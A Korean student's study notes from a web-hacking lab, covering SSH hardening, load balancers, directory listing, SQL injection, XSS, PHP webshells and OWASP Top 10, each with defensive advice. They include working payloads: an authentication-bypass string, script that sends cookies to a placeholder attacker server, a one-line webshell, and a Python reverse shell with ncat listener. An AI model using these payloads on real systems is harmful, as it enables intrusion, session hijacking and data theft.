# IT서비스와 아키텍처 및 우분투 사용 (3)

웹 서버 보안 설정 및 웹 해킹 실습 노트입니다.

---

## 📝 기본 보안 원칙

실무에서 서버 구축 시 반드시 적용해야 하는 기본 보안 3가지

1. root 계정 직접 사용 금지
2. 비밀번호 설정 확인 (초기 패스워드 반드시 변경)
3. 포트 번호 변경
   - 기본 포트는 공격자에게 이미 알려져 있음
   - 포트 변경만으로도 자동화 스캔 공격 상당수 차단 가능

---

## 📝 SSH 포트 변경

기본값인 22번 포트를 변경해 공격 표면 최소화

### 변경 순서

```bash
# 1. SSH 설정 파일 접근
cd /etc/ssh
sudo vi sshd_config

# 2. vi에서 #Port 22 찾아서 주석 제거 후 변경
# 변경 전: #Port 22
# 변경 후: Port 65001

# 3. 저장 후 종료
:wq

# 4. SSH 재시작
sudo systemctl restart ssh

# 5. 포트 변경 확인
sudo systemctl status ssh
netstat -an | grep 65001
```

> ⚠️ 포트 변경 후 반드시 Putty 등 원격 툴의 포트도 같이 변경해야 접속 가능

### vi 편집기 주요 명령어

| 명령어 | 설명 |
|---|---|
| `ESC` | 명령 모드 전환 |
| `i` | 커서 위치에서 입력 모드 |
| `a` | 커서 한 칸 오른쪽에서 입력 모드 |
| `o` | 현재 줄 아래 새 줄 추가 후 입력 모드 |
| `x` | 커서 위치 문자 삭제 |
| `dd` | 현재 줄 전체 삭제 |
| `u` | 실행 취소 (undo) |
| `Ctrl + R` | 재실행 (redo) |
| `:wq` | 저장 후 종료 |
| `:wq!` | 강제 저장 후 종료 |
| `:q!` | 저장 없이 강제 종료 |
| `/검색어` | 검색 |

### netstat 명령어

```bash
netstat -an          # 전체 네트워크 연결 상태 확인
netstat -an | grep LISTEN   # 리스닝 중인 포트만 확인
```

- 네트워크 연결 상태를 확인하는 명령어
- EST(ESTABLISHED) = 현재 연결된 세션 수
- 웹서버 기준 약 3000개의 소켓 연결 가능
  - 비유: 식당 안의 식탁 수만큼 손님 수용 가능

---

## 📝 침투 구조 이해

### 로드밸런서와 VIP

```
클라이언트
    ↓
VIP (가상 IP) ← nslookup 도메인 입력 시 나오는 IP들
    ↓
로드밸런서 (LB)
    ├── Web_01
    ├── Web_02
    └── Web_03
```

- **VIP (Virtual IP)**: 로드밸런서 앞단의 가상 IP
  - 클라이언트는 VIP만 알면 됨
  - 실제 서버 IP는 외부에 노출되지 않음
  - nslookup으로 도메인 조회 시 나오는 IP가 VIP

- **로드밸런서 종류**
  - RR/DNS: DNS 기반 라운드로빈
  - LVS: Linux Virtual Server
  - R54: AWS Route53

- **세션과 로그**
  - LB 분배 과정에서 각 세션마다 로그 생성
  - 같은 값 또는 다른 값을 가질 수 있어 통합 분석 시스템 필요
  - 세션 연결 시 세션 정보를 Session Table에 저장
  - 효율을 위한 세션 만료 시간 존재

---

## 📝 웹 해킹 실습

### 1. Directory Listing Attack

URL로 접근 제한 없는 파일에 무작위 침투하는 공격

```
http://192.168.1.101/board/          # 디렉터리 목록 노출
http://192.168.1.101/board/dbconfig.php  # DB 접속 정보 노출
```

- 접근 제한 없이 침투 성공 시
  - F12 → Network → Header에서 서버 정보 공개
  - 서버 버전, OS 정보 등 내부 정보 유출

**방어 방법**
```apache
# 아파치 설정에서 디렉터리 목록 비활성화
Options -Indexes
```

---

### 2. SQL Injection

DB 명령어를 입력값에 삽입해 인증 우회 및 데이터 탈취

**원래 로그인 쿼리**
```sql
SELECT * FROM member WHERE id='입력값' AND pw='입력값'
```

**공격 방법**
```
ID 입력창: admin
PW 입력창: ' or 1=1--
```

**쿼리 변형 결과**
```sql
SELECT * FROM member WHERE id='admin' AND pw='' or 1=1--'
-- 1=1은 항상 참 → 전체 데이터 반환 → admin 로그인 성공
```

**원리**
```
'       → 앞 따옴표 강제 종료
or 1=1  → 항상 참인 조건 추가
--      → 뒤 쿼리 전부 주석 처리
```

**다양한 SQLi 방식**

| 종류 | 설명 |
|---|---|
| Classic SQLi | 결과가 화면에 바로 출력 |
| Union Based | UNION으로 다른 테이블 데이터 추출 |
| Error Based | 에러 메시지로 정보 추출 |
| Blind SQLi | 참/거짓 반응으로 데이터 유추 |
| Time Based | 응답 시간으로 데이터 유추 |

**방어 방법**
```php
// 취약한 코드
$query = "SELECT * FROM member WHERE id='$id' AND pw='$pw'";

// 안전한 코드 (Prepared Statement)
$stmt = $pdo->prepare("SELECT * FROM member WHERE id=? AND pw=?");
$stmt->execute([$id, $pw]);
```

---

### 3. XSS Attack (Cross-Site Scripting)

악성 스크립트를 삽입해 쿠키 탈취 및 악성코드 실행

**종류**

| 종류 | 저장 위치 | 특징 |
|---|---|---|
| Stored XSS | DB에 저장 | 모든 방문자에게 실행, 가장 위험 |
| Reflected XSS | 저장 안됨 | URL 클릭한 사람만 실행 |
| DOM Based | 서버 무관 | 브라우저에서만 처리 |

**공격 예시**
```javascript
// 기본 테스트
<script>alert('XSS')</script>

// 쿠키 탈취 (Stored XSS)
// 게시판 글에 삽입 → 방문자 쿠키 탈취
<script>document.location='http://공격자서버/?c='+document.cookie</script>

// 쿠키 탈취 (Reflected XSS)
// 악성 URL을 카톡/이메일로 전송 → 클릭 유도
http://IP/board/?q=<script>document.location='http://공격자서버/?c='+document.cookie</script>
```

**탈취한 쿠키 활용**
```
세션 쿠키 탈취
    ↓
공격자 브라우저에 쿠키 주입
    ↓
로그인 없이 피해자 계정 접속 (세션 하이재킹)
```

**방어 방법**
```
입력값 특수문자 이스케이프 처리
< → &lt;
> → &gt;

HttpOnly 쿠키 설정
→ JS로 document.cookie 접근 불가
```

---

### 4. Webshell Attack

악성 PHP 파일을 업로드해 서버 명령어 원격 실행

**공격 흐름**
```
게시판 파일 업로드 기능
    ↓
webshell.php 업로드
    ↓
업로드 경로 접근
http://IP/board/pds/webshell.php
    ↓
입력창에 명령어 실행
    ↓
서버 장악
```

**webshell.php 구조**
```php
<?php system($_GET['cmd']); ?>
// 또는 입력창으로 받는 형태
```

**웹쉘로 할 수 있는 것들**
```bash
whoami                              # 현재 계정 확인
cat /etc/passwd                     # 계정 목록 탈취
mysql -u root -padmin -e "select * from webhack.member;"  # DB 데이터 탈취
```

**리버스쉘**

웹쉘에서 한 단계 더 나아가 서버가 공격자 PC로 직접 연결하는 방식

```
일반 공격: 공격자 → 서버 (방화벽 차단)
리버스쉘: 서버 → 공격자 (아웃바운드라 방화벽 허용)
```

```bash
# 공격자 PC에서 먼저 대기
ncat -lvp 4444

# 웹쉘 입력창에서 실행
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("공격자IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'

# 연결 성공 시 공격자 CMD에서 서버 명령어 실행 가능
# www-data 계정으로 접속됨 (아파치 실행 계정)
```

> ⚠️ 파일 업로드가 가능한 시점에서 이미 서버 조작 가능
> 업로드 자체를 막는 것이 핵심 방어

**방어 방법**
```
.php 확장자 업로드 차단
업로드 폴더 실행 권한 제거
파일명 랜덤 변경
업로드 경로를 웹루트 밖으로
WAF(웹방화벽) 적용
```

---

## 📝 OWASP Top 10 : 2025

| 순위 | 항목 | 설명 |
|---|---|---|
| A01 | Broken Access Control | 권한 없는 접근 허용 |
| A02 | Security Misconfiguration | 잘못된 보안 설정 |
| A03 | Software Supply Chain Failures | 외부 라이브러리 취약점 |
| A04 | Cryptographic Failures | 암호화 미적용/취약 암호화 |
| A05 | Injection | SQLi, 명령어 인젝션 등 |
| A06 | Insecure Design | 설계 단계의 보안 결함 |
| A07 | Authentication Failures | 인증 과정 취약점 |
| A08 | Software or Data Integrity Failures | 무결성 검증 부재 |
| A09 | Security Logging and Alerting Failures | 로깅/모니터링 부재 |
| A10 | Mishandling of Exceptional Conditions | 예외 처리 오류 |

> 오늘 실습과 연결:
> A01 → Directory Listing, URL 직접 접근
> A05 → SQL Injection
> A07 → XSS 쿠키 탈취 → 세션 하이재킹
> A09 → tail -f /var/log/auth.log 로그 모니터링
